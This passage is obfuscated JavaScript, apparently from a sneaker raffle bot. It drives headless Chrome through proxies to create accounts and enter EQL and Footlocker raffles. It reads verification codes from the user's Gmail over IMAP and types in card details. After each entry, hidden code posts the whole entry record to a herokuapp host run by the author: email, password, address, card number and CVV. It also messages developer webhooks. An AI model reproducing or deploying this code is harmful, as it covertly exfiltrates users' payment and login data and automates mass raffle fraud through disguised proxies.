                            }), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Getting\x20Session'), await _0xfffa6d['setRequestInterception'](!![]), _0xfffa6d['on']('request', _0x48f348 => {
                                _0x48f348['resourceType']() === 'image' || _0x48f348['resourceType']() === 'font' || _0x48f348['resourceType']() === 'media' ? _0x48f348['abort']() : _0x48f348['continue']();
                            });
                            try {
                                await _0xfffa6d['goto']('' + _0x21c29e);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xa2099c(0x3e8), await _0xfffa6d['waitForSelector']('#email'), await _0xfffa6d['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xa2099c(0x3e8);
                            try {
                                _0x6628dd[_0x1948af]['Url']['includes']('en-GB') ? await _0xfffa6d['click']('li[data-value=\x22UK\x20' + _0x6628dd[_0x1948af]['Size'] + '\x20/\x20US\x20' + (Number(_0x6628dd[_0x1948af]['Size']) + 0x1) + '\x22]') : await _0xfffa6d['click']('li[data-value=\x22EU\x20' + _0x6628dd[_0x1948af]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x6628dd[_0x1948af]['Size']);
                            }
                            await _0xa2099c(0x6a4), await _0xfffa6d['type']('#email', '' + _0x6628dd[_0x1948af]['Email']), await _0xa2099c(0x352), await _0xfffa6d['waitForSelector']('#password'), await _0xfffa6d['type']('#password', '' + _0x6628dd[_0x1948af]['Password']), await _0xa2099c(0x352), await _0xfffa6d['type']('#phone', '' + _0x6628dd[_0x1948af]['Phone']), await _0xa2099c(0x352);
                            const _0x223565 = await _0xfffa6d['$']('#title\x20>\x20label');
                            await _0xa2099c(0x12c);
                            _0x223565 && await _0x223565['click']();
                            await _0xfffa6d['type']('#firstName', '' + _0x6628dd[_0x1948af]['FirstName']), await _0xa2099c(0x352), await _0xfffa6d['type']('#lastName', '' + _0x6628dd[_0x1948af]['LastName']), await _0xa2099c(0x352);
                            _0x6628dd[_0x1948af]['Url']['includes']('footlocker.de') ? await _0xfffa6d['type']('#birthdate', _0x49c08b(0xa, 0x1c) + '.' + _0x49c08b(0xa, 0xc) + '.' + _0x49c08b(0x7c6, 0x7d3)) : await _0xfffa6d['type']('#birthdate', _0x49c08b(0xa, 0x1c) + '-' + _0x49c08b(0xa, 0xc) + '-' + _0x49c08b(0x7c6, 0x7d3));
                            await _0xa2099c(0x352), await _0xfffa6d['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x6628dd[_0x1948af]['Url']['includes']('en-GB') && await _0xfffa6d['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0xa2099c(0x1f4), await _0xa2099c(0x5dc);
                            if (!_0x21c29e['includes']('footlocker'))
                                try {
                                    await _0xfffa6d['click']('#country');
                                    const _0x3fab41 = await _0xfffa6d['$']('li[data-value=\x22' + _0x6628dd[_0x1948af]['Country'] + '\x22]');
                                    await _0x3fab41['click'](), await _0x3fab41['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xa2099c(0x3e8);
                            if (!_0x6628dd[_0x1948af]['Url']['includes']('en-GB')) {
                                await _0xfffa6d['click']('#stateAutocomplete'), await _0xa2099c(0x1f4);
                                try {
                                    const _0x746c52 = await _0xfffa6d['$x']('//li[text()=\x22' + _0x6628dd[_0x1948af]['State'] + '\x22]');
                                    await _0x746c52[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Setting\x20Address'), await _0xa2099c(0x3e8), await _0xa2099c(0x1f4), await _0xfffa6d['type']('#address1', _0x6628dd[_0x1948af]['Address1'] + '\x20' + _0x6628dd[_0x1948af]['HouseNumber']), await _0xa2099c(0x1f4), await _0xfffa6d['type']('#address2', '' + _0x6628dd[_0x1948af]['Address2']), await _0xa2099c(0x1f4), await _0xfffa6d['type']('#city', '' + _0x6628dd[_0x1948af]['City']), await _0xa2099c(0x1f4), await _0xfffa6d['type']('#postcode', '' + _0x6628dd[_0x1948af]['Zip']), await _0xa2099c(0x3e8), await _0xfffa6d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xa2099c(0x3e8), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0xeb4782 = await _0xfffa6d['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0xeb4782 && (await _0xfffa6d['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfffa6d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xfffa6d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xa2099c(0x4b0), await _0xfffa6d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xa2099c(0x1f4), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['CardNumber']), await _0xa2099c(0x320), await _0xfffa6d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xfffa6d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['ExpiryDate']), await _0xa2099c(0x4b0), await _0xfffa6d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xfffa6d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['CVV']), await _0xa2099c(0x226), await _0xfffa6d['type']('input[name=\x22postalCode\x22]', '' + _0x6628dd[_0x1948af]['Zip']), await _0xa2099c(0x226));
                            const _0x304a23 = await _0xfffa6d['$']('.__PrivateStripeElement');
                            _0x304a23 && (await _0xa2099c(0x1f4), await _0xfffa6d['click']('.__PrivateStripeElement'), await _0xfffa6d['click']('.__PrivateStripeElement'), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['CardNumber']), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['ExpiryDate']), await _0xfffa6d['keyboard']['type']('' + _0x6628dd[_0x1948af]['CVV']));
                            await _0xa2099c(0x226), await _0xfffa6d['click']('#paymentConsent'), await _0xa2099c(0x226), await _0xfffa6d['click']('#termsConsent'), await _0xa2099c(0x2bc), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xfffa6d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xa2099c(0x2710);
                            try {
                                await _0xfffa6d['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xa2099c(0xbb8), await _0xfffa6d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5c69f2 => _0x5c69f2['click']()), await _0xfffa6d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4c915e => _0x4c915e['click']());
                            } catch {
                            }
                            try {
                                await _0xfffa6d['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0xc2dd4d = await _0xfffa6d['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0xc2dd4d) {
                                    _0x376369['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x6628dd[_0x1948af]['Email'] + ',' + _0x6628dd[_0x1948af]['Password'] + ',' + _0x6628dd[_0x1948af]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x408c64() {
                                var _0x10034f, _0x320fbc = ![];
                                for (var _0x38589e = 0x0; _0x38589e < 0x18; _0x38589e++) {
                                    async function _0x7fe3b3() {
                                        var _0x3c3204 = new _0x39794d({
                                            'user': _0x2795a0['masterMail'],
                                            'password': _0x2795a0['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4ab496(_0x24aa6d) {
                                            _0x3c3204['openBox']('INBOX', ![], _0x24aa6d);
                                        }
                                        _0x3c3204['once']('ready', function () {
                                            console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4ab496(function (_0x393a94, _0x23c1ba) {
                                                console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x393a94)
                                                    throw _0x393a94;
                                                _0x3c3204['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x27e364, _0x2cd71c) {
                                                    if (!_0x2cd71c || !_0x2cd71c['length'])
                                                        console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3c3204['end']();
                                                    else {
                                                        var _0x5dfdf0 = _0x3c3204['seq']['fetch'](_0x2cd71c, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5dfdf0['on']('message', function (_0x2ee39a, _0x8df9a2) {
                                                            var _0x1a6c48 = '(#' + _0x8df9a2 + ')\x20';
                                                            _0x2ee39a['on']('body', function (_0x26add9, _0x14e83e) {
                                                                _0x3020dc(_0x26add9, (_0x504705, _0x549cf4) => {
                                                                    if (_0x549cf4['subject']['includes']('code')) {
                                                                        const _0x36b54f = _0x549cf4['text']['split']('\x0a\x0a')[0x3], _0xc449e4 = _0x36b54f['split']('\x0a')[0x1];
                                                                        _0x10034f = _0xc449e4;
                                                                    }
                                                                });
                                                            }), _0x2ee39a['once']('end', function () {
                                                            });
                                                        }), _0x5dfdf0['once']('error', function (_0x139c04) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5dfdf0['once']('end', function () {
                                                            _0x3c3204['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3c3204['once']('error', function (_0x39c1c5) {
                                            console['log'](_0x536226['red'](_0x39c1c5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x320fbc = !![];
                                        }), _0x3c3204['once']('end', async function () {
                                        }), _0x3c3204['connect']();
                                    }
                                    _0x7fe3b3(), await _0xa2099c(0x1388);
                                    if (_0x10034f)
                                        return _0x10034f;
                                    if (_0x320fbc)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x38589e == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x408c64(), await _0xa2099c(0x1f4), await _0xfffa6d['type']('#code', '' + code), await _0xa2099c(0x3e8), await _0xfffa6d['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x101a53 => _0x101a53['click']()), await _0xfffa6d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0xfffa6d['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x6628dd[_0x1948af]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x376369['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x6628dd[_0x1948af]['Email'] + ',' + _0x6628dd[_0x1948af]['Password'] + ',' + _0x6628dd[_0x1948af]['Phone']), _0x58dccc = 'no', _0x48af7e(_0x6628dd[_0x1948af], _0x55648f);
                            var _0xd4c139 = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', ![]), _0x28f77d = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'pub', ![]);
                            let _0x57ee38 = _0x6628dd[_0x1948af];
                            try {
                                prxdata = {
                                    'username': _0x1bdb7f['replace']('#', ''),
                                    'module': _0x55648f['name'],
                                    'entrydata': JSON['stringify'](_0x57ee38),
                                    'proxy': '' + _0x3e3da0[_0x1948af]
                                };
                                var _0x5687e4 = JSON['stringify'](prxdata);
                                let _0xe88fbd = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x5687e4, _0xe88fbd);
                            } catch (_0x97de5e) {
                            }
                            const _0x4f8232 = {
                                'succesDEVMSG': { 'embeds': [_0xd4c139] },
                                'succesPUBMSG': { 'embeds': [_0x28f77d] }
                            };
                            try {
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x4f8232['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x4f8232['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x4f8232['succesPUBMSG']);
                            } catch (_0x3e2119) {
                                console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3e2119));
                            }
                        } catch (_0x4f1d83) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20' + _0x4f1d83)), _0x1bf9a2 = '' + _0x4f1d83;
                            var _0x1a09ed = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', !![], _0x1bf9a2), _0xd4c139 = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', ![]), _0x28f77d = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'pub', ![]);
                            const _0x250721 = {
                                'succesDEVMSG': { 'embeds': [_0xd4c139] },
                                'succesPUBMSG': { 'embeds': [_0x28f77d] }
                            };
                            _0x250721['errorDEV'] = { 'embeds': [_0x1a09ed] };
                            _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x250721['errorDEV']);
                            await _0x310f97(_0x281108, _0x250721['errorDEV']);
                            if (!_0x58dccc == 'no')
                                _0x58dccc = 'yes';
                        } finally {
                            _0x258b65 && _0x258b65['close']();
                            if (_0x58dccc == 'yes' && _0xb5edb4 != 0x5) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Retrying\x20(' + _0xb5edb4 + '\x20/\x205)')), _0x1948af = _0x1948af - 0x1, _0xb5edb4 = _0xb5edb4 + 0x1;
                                continue;
                            }
                            _0x58dccc == 'yes' && _0xb5edb4 >= 0x5 && (_0x391951(_0x6628dd[_0x1948af], _0x55648f), _0x58dccc = 'no', _0xb5edb4 = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    } else {
                        const _0x19eb65 = '' + _0x6628dd[_0x1948af]['Url'];
                        if (_0x58dccc != 'yes')
                            var _0x58dccc = '', _0xb5edb4 = 0x0;
                        if (_0x6628dd[_0x1948af]['Email'] == '' || _0x6628dd[_0x1948af]['FirstName'] == '' || _0x6628dd[_0x1948af]['LastName'] == '') {
                            console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x6628dd[_0x1948af]['Password'] == '' && (_0x6628dd[_0x1948af]['Password'] = 'JRaffles23!');
                        if (_0x2795a0['useRandomProxy'] = ![])
                            var _0xbda022 = _0x3e3da0[_0x1948af]['split'](':');
                        else
                            var _0x1016a0 = Math['round'](Math['random']() * (_0x3e3da0['length'] - 0x1)), _0xbda022 = _0x3e3da0[_0x1016a0]['split'](':');
                        var _0x258b65;
                        try {
                            _0x258b65 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbda022[0x0] + ':' + _0xbda022[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x258b65 = await _0xfda795['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xbda022[0x0] + ':' + _0xbda022[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x35f472 = await _0x258b65['newPage']();
                            await _0x35f472['authenticate']({
                                'username': '' + _0xbda022[0x2],
                                'password': '' + _0xbda022[0x3]
                            }), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35f472['setRequestInterception'](!![]), _0x35f472['on']('request', _0x461679 => {
                                _0x461679['resourceType']() === 'image' || _0x461679['resourceType']() === 'font' || _0x461679['resourceType']() === 'media' ? _0x461679['abort']() : _0x461679['continue']();
                            }), await _0x35f472['goto'](_0x19eb65), await _0x35f472['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x35f472['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xa2099c(0x7d0), await _0x35f472['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x35f472['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xa2099c(0x3e8), await _0x35f472['waitForSelector']('#email'), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x35f472['type']('#email', '' + _0x6628dd[_0x1948af]['Email']), await _0xa2099c(0x352), await _0x35f472['waitForSelector']('#password'), await _0x35f472['type']('#password', '' + _0x6628dd[_0x1948af]['Password']), await _0xa2099c(0x352), await _0x35f472['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xa2099c(0x1388);
                            if (!_0x6628dd[_0x1948af]['Url']['includes']('footlocker'))
                                await _0x35f472['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x35f472['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x48af7e(_0x6628dd[_0x1948af], _0x55648f), _0x58dccc = 'no';
                                continue;
                            }
                            await _0x35f472['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xa2099c(0x3e8);
                            try {
                                _0x6628dd[_0x1948af]['Url']['includes']('en-GB') ? await _0x35f472['click']('li[data-value=\x22UK\x20' + _0x6628dd[_0x1948af]['Size'] + '\x20/\x20US\x20' + (Number(_0x6628dd[_0x1948af]['Size']) + 0x1) + '\x22]') : await _0x35f472['click']('li[data-value=\x22EU\x20' + _0x6628dd[_0x1948af]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x6628dd[_0x1948af]['Size']);
                            }
                            await _0xa2099c(0x1f4);
                            const _0x4cee9e = await _0x35f472['$']('#title\x20>\x20label');
                            await _0xa2099c(0x12c);
                            _0x4cee9e && await _0x4cee9e['click']();
                            await _0x35f472['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x35f472['focus']('#postcode'), await _0x35f472['keyboard']['down']('Control'), await _0x35f472['keyboard']['press']('A'), await _0x35f472['keyboard']['up']('Control'), await _0x35f472['keyboard']['press']('Backspace'), await _0x35f472['keyboard']['type'](_0x6628dd[_0x1948af]['Zip']), await _0xa2099c(0x60e), await _0x35f472['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xa2099c(0x3e8), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xa2099c(0x1f4);
                            const _0x2a9226 = await _0x35f472['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2a9226 && (await _0x35f472['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x35f472['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x35f472['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xa2099c(0x4b0), await _0x35f472['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xa2099c(0x1f4), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['CardNumber']), await _0xa2099c(0x320), await _0x35f472['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['ExpiryDate']), await _0xa2099c(0x4b0), await _0x35f472['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['CVV']), await _0xa2099c(0x226), await _0x35f472['type']('input[name=\x22postalCode\x22]', '' + _0x6628dd[_0x1948af]['Zip']), await _0xa2099c(0x226));
                            const _0x5b6845 = await _0x35f472['$']('.__PrivateStripeElement');
                            _0x5b6845 && (await _0x35f472['click']('#billingName'), await _0x35f472['click']('#billingName'), await _0x35f472['type']('#billingName', '' + _0x6628dd[_0x1948af]['NameOnCard']), await _0xa2099c(0x1f4), await _0x35f472['click']('.__PrivateStripeElement'), await _0x35f472['click']('.__PrivateStripeElement'), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['CardNumber']), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['ExpiryDate']), await _0x35f472['keyboard']['type']('' + _0x6628dd[_0x1948af]['CVV']));
                            await _0xa2099c(0x226), await _0x35f472['click']('#paymentConsent'), await _0xa2099c(0x226), await _0x35f472['click']('#termsConsent'), await _0xa2099c(0x2bc), console['log'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x35f472['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xa2099c(0x2710);
                            try {
                                await _0x35f472['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xa2099c(0xbb8), await _0x35f472['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2cd938 => _0x2cd938['click']()), await _0x35f472['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x681b33 => _0x681b33['click']());
                            } catch {
                            }
                            try {
                                await _0x35f472['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x536226['green'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x48af7e(_0x6628dd[_0x1948af], _0x55648f);
                            var _0xd4c139 = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', ![]), _0x28f77d = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'pub', ![]);
                            let _0x3b1cf3 = _0x6628dd[_0x1948af];
                            try {
                                prxdata = {
                                    'username': _0x1bdb7f['replace']('#', ''),
                                    'module': _0x55648f['name'],
                                    'entrydata': JSON['stringify'](_0x3b1cf3),
                                    'proxy': '' + _0x3e3da0[_0x1948af]
                                };
                                var _0x5687e4 = JSON['stringify'](prxdata);
                                let _0x4b8200 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3f36f4['post']('https://jraffles.herokuapp.com/success', _0x5687e4, _0x4b8200);
                            } catch (_0x4af284) {
                            }
                            const _0x2d9193 = {
                                'succesDEVMSG': { 'embeds': [_0xd4c139] },
                                'succesPUBMSG': { 'embeds': [_0x28f77d] }
                            };
                            try {
                                _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x2d9193['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x8cde2d, _0x2d9193['succesDEVMSG']), await _0xa2099c(0xc8), await _0x310f97(_0x44d24a, _0x2d9193['succesPUBMSG']);
                            } catch (_0x2bf2d8) {
                                console['log'](_0x536226['yellow'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2bf2d8));
                            }
                            _0x58dccc = 'no';
                        } catch (_0x2f15b5) {
                            console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20' + _0x2f15b5)), _0x1bf9a2 = '' + _0x2f15b5;
                            var _0x1a09ed = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', !![], _0x1bf9a2), _0xd4c139 = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'dev', ![]), _0x28f77d = await _0x258e8b(_0x6628dd[_0x1948af], _0x55648f, 'pub', ![]);
                            const _0x2f1cb8 = {
                                'succesDEVMSG': { 'embeds': [_0xd4c139] },
                                'succesPUBMSG': { 'embeds': [_0x28f77d] }
                            };
                            _0x2f1cb8['errorDEV'] = { 'embeds': [_0x1a09ed] }, _0x2795a0['webhook'] != undefined && _0x2795a0['webhook'] != '' && await _0x310f97(_0x2795a0['webhook'], _0x2f1cb8['errorDEV']), await _0x310f97(_0x281108, _0x2f1cb8['errorDEV']), _0x58dccc = 'yes';
                        } finally {
                            _0x258b65 && _0x258b65['close']();
                            if (_0x58dccc == 'yes' && _0xb5edb4 != 0x5) {
                                console['log'](_0x536226['red'](_0x24b1d6() + '\x20[' + _0x55648f['name'] + ']\x20Task\x20' + (_0x1948af + 0x1) + '\x20:\x20Retrying\x20(' + _0xb5edb4 + '\x20/\x205)')), _0x1948af = _0x1948af - 0x1, _0xb5edb4 = _0xb5edb4 + 0x1;
                                continue;
                            }
                            _0x58dccc == 'yes' && _0xb5edb4 >= 0x5 && (_0x391951(_0x6628dd[_0x1948af], _0x55648f), _0x58dccc = 'no', _0xb5edb4 = 0x0), console['log']('Waiting\x20for\x20' + _0x2795a0['delay'] + '\x20ms'), await _0xa2099c(_0x2795a0['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
